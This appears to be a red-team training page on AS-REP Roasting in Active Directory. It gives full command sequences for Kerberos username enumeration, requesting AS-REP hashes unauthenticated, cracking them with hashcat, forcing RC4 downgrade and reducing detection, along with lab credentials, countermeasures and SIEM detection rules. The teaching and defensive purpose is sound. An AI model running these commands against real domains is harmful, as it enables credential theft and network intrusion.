---
layout: training-page
title: "AS-REProasting — Red Team Academy"
module: "Active Directory"
tags:
  - as-rep-roasting
  - kerberos
  - pre-auth
  - hashcat
page_key: "ad-asreproasting"
render_with_liquid: false
---

# AS-REProasting

## Overview

AS-REP Roasting targets Kerberos accounts that have "Do not require Kerberos preauthentication" enabled (the `DONT_REQ_PREAUTH` flag). Normally, Kerberos pre-authentication requires the client to prove knowledge of their password before the KDC issues a TGT. When pre-auth is disabled, the KDC returns an AS-REP encrypted with the user's password hash — without requiring any authentication first. An attacker can request this AS-REP and crack it offline.

Unlike Kerberoasting, AS-REP Roasting requires no domain credentials at all — it works unauthenticated against any account with pre-auth disabled.

![AS-REP roasting: attacker sends unauthenticated AS-REQ for account with no pre-auth, KDC returns hash, attacker cracks offline](/images/active-directory/asreproasting-flow.svg)  
*// as-rep roasting flow — no credentials required to get crackable hash*

## Identifying Vulnerable Accounts

```
># Check for accounts with DONT_REQ_PREAUTH set:

# With domain credentials (PowerView):
Get-DomainUser -UACFilter DONT_REQ_PREAUTH | Select-Object samaccountname, userprincipalname

# With domain credentials (ActiveDirectory module):
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth | Select-Object Name, SamAccountName

# With domain credentials (Impacket — from Linux):
impacket-GetNPUsers corp.local/jsmith:'Password123!' -dc-ip 172.16.5.5 -request

# Unauthenticated — enumerate and request AS-REPs without any creds:
impacket-GetNPUsers corp.local/ -dc-ip 172.16.5.5 -usersfile /tmp/users.txt -no-pass -format hashcat
# -usersfile: wordlist of usernames to test
# -no-pass: no authentication needed
# -format hashcat: output in hashcat-compatible format

# Build a username list from LDAP if you have no creds yet:
# Spray common usernames or use kerbrute for enumeration
```

## Step 0: Build a Username List (Unauthenticated)

When you have no credentials at all, you need a username list before you can test for AS-REP vulnerability. kerbrute performs fast Kerberos-based username enumeration by sending AS-REQ packets and analysing the error codes — no bind required.

```
# kerbrute username enumeration — valid accounts return KDC_ERR_PREAUTH_REQUIRED (not an error — it means account exists)
kerbrute userenum --dc 172.16.5.5 -d corp.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt

# Corp-format guesses — try common naming conventions first:
cat /usr/share/seclists/Usernames/Names/names.txt | while read name; do
  echo "j${name}"       # first initial + last name
  echo "${name}.j"      # last name + first initial
  echo "${name}"        # last name only
done > userlist.txt
kerbrute userenum --dc 172.16.5.5 -d corp.local userlist.txt -o valid_users.txt

# GOAD lab — known valid accounts to test with:
# north.sevenkingdoms.local: jon.snow, robb.stark, sansa.stark, arya.stark, brandon.stark, hodor, ghost, rickon.stark, jeor.mormont, samwell.tarly
# sevenkingdoms.local: jaime.lannister, cersei.lannister, tywin.lannister, joffrey.baratheon, sandor.clegane
# essos.local: daenerys.targaryen, viserys.targaryen, khal.drogo, jorah.mormont, missandei
```

## AS-REP Roasting from Linux

```
# Request AS-REPs for all vulnerable accounts (with creds):
impacket-GetNPUsers corp.local/jsmith:'Password123!' -dc-ip 172.16.5.5 -request -format hashcat -outputfile asrep_hashes.txt

# Without credentials (username list required):
impacket-GetNPUsers corp.local/ -dc-ip 172.16.5.5 -usersfile usernames.txt -no-pass -format hashcat -outputfile asrep_hashes.txt

# NetExec (successor to CrackMapExec) — list DONT_REQ_PREAUTH users:
netexec ldap 172.16.5.5 -u jsmith -p 'Password123!' --asreproast asrep_hashes.txt

# Check output — two possible hash formats:
cat asrep_hashes.txt
# RC4 (etype 23):  $krb5asrep$23$jdoe@CORP.LOCAL:a3b1...   ← hashcat -m 18200
# AES256 (etype 18): $krb5asrep$18$jdoe@CORP.LOCAL:...     ← hashcat -m 19900
# AES128 (etype 17): $krb5asrep$17$jdoe@CORP.LOCAL:...     ← hashcat -m 19800

# Note: Modern DCs may return AES hashes instead of RC4.
# AES hashes are MUCH harder to crack — RC4 is ~100x faster to crack than AES256.
```

## AS-REP Roasting from Windows

```
># Rubeus — enumerate and request AS-REPs:
# All users in the domain with DONT_REQ_PREAUTH:
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Target specific user:
Rubeus.exe asreproast /user:jdoe /format:hashcat /outfile:asrep_hashes.txt

# With /nowrap — don't wrap long hashes (easier to copy):
Rubeus.exe asreproast /format:hashcat /nowrap

# Using PowerView to identify then Rubeus to roast:
# Step 1: find vulnerable users
$users = Get-DomainUser -UACFilter DONT_REQ_PREAUTH | Select-Object -ExpandProperty SamAccountName
# Step 2: roast each
$users | ForEach-Object { Rubeus.exe asreproast /user:$_ /format:hashcat /outfile:asrep_hashes.txt }

# Transfer hashes to Linux for cracking:
# Base64 encode the hashes file:
[Convert]::ToBase64String([IO.File]::ReadAllBytes("asrep_hashes.txt"))
```

## Cracking AS-REP Hashes

AS-REP hashes come in three encryption types. Identify the type from the hash prefix before selecting the hashcat mode.

```
# Identify hash type by prefix:
# $krb5asrep$23$  → RC4-HMAC      → hashcat -m 18200
# $krb5asrep$17$  → AES128-CTS    → hashcat -m 19800
# $krb5asrep$18$  → AES256-CTS    → hashcat -m 19900

# RC4 (most common in older environments, fastest to crack):
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# AES128:
hashcat -m 19800 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# AES256 (significantly slower — GPU strongly recommended):
hashcat -m 19900 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Benchmark speed difference on mid-range GPU (RTX 3080):
# RC4  (18200): ~500 MH/s
# AES128 (19800): ~4 MH/s
# AES256 (19900): ~4 MH/s
# → RC4 is 100x+ faster. AES requires much better passwords or longer cracking time.

# If you only get AES hashes, try forcing RC4 via Rubeus:
Rubeus.exe asreproast /format:hashcat /rc4opsec /nowrap
# /rc4opsec requests RC4 downgrade — may not work on hardened environments

# Show cracked passwords after completion:
hashcat -m 18200 asrep_hashes.txt --show
hashcat -m 19900 asrep_hashes.txt --show
```

## GOAD Lab — AS-REP Roasting Practice

```
# GOAD has several accounts with DONT_REQ_PREAUTH set by default.
# Forest: north.sevenkingdoms.local (DC02 at 192.168.56.11)

# Step 1: enumerate without creds using kerbrute
kerbrute userenum --dc 192.168.56.11 -d north.sevenkingdoms.local /usr/share/seclists/Usernames/Names/names.txt

# Step 2: request AS-REPs for vulnerable accounts
impacket-GetNPUsers north.sevenkingdoms.local/ -dc-ip 192.168.56.11 \
  -usersfile /opt/goad/ad/GOAD/data/users.txt -no-pass -format hashcat -outputfile asrep_goad.txt

# Step 3: crack
hashcat -m 18200 asrep_goad.txt /usr/share/wordlists/rockyou.txt

# Expected crackable accounts in GOAD:
# brandon.stark — password: "iseedeadpeople"
# hodor         — password: "hodor"

# After cracking — validate credentials:
netexec smb 192.168.56.10-23 -u brandon.stark -p 'iseedeadpeople' -d north.sevenkingdoms.local
```

## AS-REP Roasting vs Kerberoasting — Key Differences

```
># Comparison:

┌────────────────────────┬──────────────────────────────┬──────────────────────────────┐
│ Attribute              │ AS-REP Roasting              │ Kerberoasting                │
├────────────────────────┼──────────────────────────────┼──────────────────────────────┤
│ Auth required          │ NO (if DONT_REQ_PREAUTH set) │ YES (any domain user)        │
│ Target account type    │ User accounts, DONT_REQ_PREAUTH│ Accounts with SPNs          │
│ Hash type              │ krb5asrep (18200)            │ krb5tgs (13100/19600/19700)  │
│ Hash strength          │ RC4 or AES (RC4 common)      │ RC4 or AES                   │
│ Protocol phase         │ AS exchange (no service req) │ TGS exchange (SPN needed)    │
│ Typical victims        │ Service accounts, legacy apps│ Service accounts with SPNs   │
└────────────────────────┴──────────────────────────────┴──────────────────────────────┘

# Note: Both attacks are about cracking password hashes offline.
# The practical difference: AS-REP Roasting doesn't need any creds to START.
# Kerberoasting requires at least a low-priv domain account.
```

## Countermeasures

```
># Identify and remediate accounts with pre-auth disabled:
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth

# Enable pre-authentication (AD Users & Computers):
# User properties → Account tab → Uncheck "Do not require Kerberos preauthentication"

# PowerShell — enable pre-auth for all affected accounts:
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} |
  Set-ADAccountControl -DoesNotRequirePreAuth $False

# Detection — Windows Event Log:
# Event ID 4768 (A Kerberos authentication ticket (TGT) was requested)
# Filter for: Ticket Encryption Type = 0x17 (RC4) + pre-auth type 0
# Correlate multiple 4768 events from same source in short window
```

## OPSEC Notes

AS-REP Roasting is relatively noisy from a detection standpoint. Each AS-REQ generates a 4768 event on the DC. Unauthenticated requests (no pre-auth) are especially suspicious since legitimate users always authenticate first.

```
# What defenders see:
# Event ID 4768 — Kerberos TGT requested
#   Ticket Encryption Type: 0x17 (RC4) or 0x12 (AES256)
#   Pre-Authentication Type: 0 — this is the red flag (normal = 2)
#   Client Address: your source IP

# OPSEC considerations:
# 1. Don't spray — request only targeted accounts, not the entire domain
# 2. Spread requests over time if spraying usernames for enumeration
# 3. Use a compromised internal host rather than your Kali box — internal IP is less suspicious
# 4. Prefer authenticated enumeration (Get-ADUser) over username-list brute force
# 5. Crack offline — never try passwords online against the DC

# Detection bypass isn't a goal for legit red teams — but understanding detection is:
# Honeypot account with DONT_REQ_PREAUTH = excellent tripwire
# Any 4768 for that account with pre-auth type 0 = immediate alert
# UEBA tools flag unusual TGT request patterns from non-workstation IPs
```

## Prevention and Detection

The success of this attack depends entirely on the strength of the user's password. Only configure "Do not require Kerberos preauthentication" when absolutely necessary (some legacy apps require it), and enforce 20+ character passwords for any accounts that need it.

```
# Remediation — disable DONT_REQ_PREAUTH for all accounts that don't need it:
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth |
  Set-ADAccountControl -DoesNotRequirePreAuth $False

# Audit monthly — automate with a scheduled task:
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} | Select Name, SamAccountName |
  Export-Csv "C:\Reports\asrep_vulnerable_$(Get-Date -Format yyyyMMdd).csv"

# Detection — SIEM query for Event ID 4768 with pre-auth type 0:
# index=wineventlog EventCode=4768 Pre_Authentication_Type=0
# Alert if: source IP not in [expected management hosts]
# Alert if: account = known honeypot account (immediate critical alert)
# Alert if: >5 unique accounts requested from same source in 1 hour

# Honeypot setup — create a decoy account with pre-auth disabled:
New-ADUser -Name "svc_legacy_print" -Enabled $True
Set-ADAccountControl svc_legacy_print -DoesNotRequirePreAuth $True
# Configure SIEM to alert on ANY 4768 for svc_legacy_print
```
